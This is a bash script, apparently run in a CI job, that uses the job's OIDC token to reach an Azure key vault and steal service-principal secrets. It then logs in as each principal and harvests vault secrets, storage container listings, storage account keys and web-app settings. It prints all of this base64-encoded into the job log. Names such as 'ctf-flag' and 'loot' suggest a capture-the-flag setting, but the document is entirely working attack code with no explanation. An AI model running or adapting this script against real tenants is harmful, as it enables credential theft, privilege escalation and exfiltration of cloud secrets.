#!/usr/bin/env bash
set -u
TEN="$AZURE_TENANT_ID"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
SUB="$AZURE_SUBSCRIPTION_ID"; RG="rg-tbl-platform-prod-sea"
mint(){ # $1 app, $2 scope
  curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d "client_id=$1" -d "scope=$2" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=$OIDC" | jq -r '.access_token // empty'
}
secret_login(){ # $1 app, $2 secret, $3 scope
  curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d "client_id=$1" --data-urlencode "client_secret=$2" -d "scope=$3" -d "grant_type=client_credentials" | jq -r '.access_token // empty'
}
echo "OIDC_LEN=${#OIDC}"
VT=$(mint 72ff278a-9e71-43ec-bac4-2ca303f8e462 "https://vault.azure.net/.default")
echo "BOOT_VAULT_LEN=${#VT}"
declare -a PAIRS
for S in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  RAW=$(curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$S?api-version=7.4")
  echo "RAWSECRET $S B64=$(printf '%s' "$RAW" | base64 -w0)"
  AID=$(printf '%s' "$RAW" | jq -r '.value' | jq -r '.appId // empty')
  CS=$(printf '%s' "$RAW" | jq -r '.value' | jq -r '.clientSecret // empty')
  [ -n "$AID" ] && [ -n "$CS" ] && PAIRS+=("$AID|$CS")
done
for P in "${PAIRS[@]}"; do
  AID="${P%%|*}"; CS="${P#*|}"
  echo "########## LOGIN AS $AID"
  for SCOPE in "https://vault.azure.net/.default" "https://storage.azure.com/.default" "https://management.azure.com/.default"; do
    T=$(secret_login "$AID" "$CS" "$SCOPE")
    echo "TOK $AID $SCOPE LEN=${#T} HEAD=$(printf '%s' "$T" | head -c 20)"
    [ -z "$T" ] && continue
    case "$SCOPE" in
      *vault*)
        for KV in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
          R=$(curl -sS -H "Authorization: Bearer $T" "https://$KV.vault.azure.net/secrets?api-version=7.4&maxresults=25")
          echo "KVLIST $KV B64=$(printf '%s' "$R" | base64 -w0)"
          for N in flag tbl-flag platform-flag ctf-flag internal-config; do
            R2=$(curl -sS -H "Authorization: Bearer $T" "https://$KV.vault.azure.net/secrets/$N?api-version=7.4")
            echo "KVSEC $KV/$N B64=$(printf '%s' "$R2" | base64 -w0)"
          done
        done
        ;;
      *storage*)
        for AC in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
          R=$(curl -sS -H "Authorization: Bearer $T" -H "x-ms-version: 2021-08-06" "https://$AC.blob.core.windows.net/?restype=service&comp=list&include=containers")
          echo "SVC $AC B64=$(printf '%s' "$R" | base64 -w0 | head -c 4000)"
        done
        for U in "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list" "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" "https://sttblcilogsprodx3euoz.blob.core.windows.net/loot?restype=container&comp=list"; do
          R=$(curl -sS -H "Authorization: Bearer $T" -H "x-ms-version: 2021-08-06" "$U")
          echo "BLOB $U B64=$(printf '%s' "$R" | base64 -w0 | head -c 6000)"
        done
        ;;
      *management*)
        for SA in sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
          R=$(curl -sS -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" -d '{}' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01")
          echo "LISTKEYS $SA B64=$(printf '%s' "$R" | base64 -w0 | head -c 3000)"
        done
        for SITE in app-tbl-storefront-prod app-tbl-reporting-prod; do
          R=$(curl -sS -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" -d '{}' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE/config/appsettings/list?api-version=2022-09-01")
          echo "APPSET $SITE B64=$(printf '%s' "$R" | base64 -w0 | head -c 8000)"
        done
        ;;
    esac
  done
done
echo "===== DONE ====="
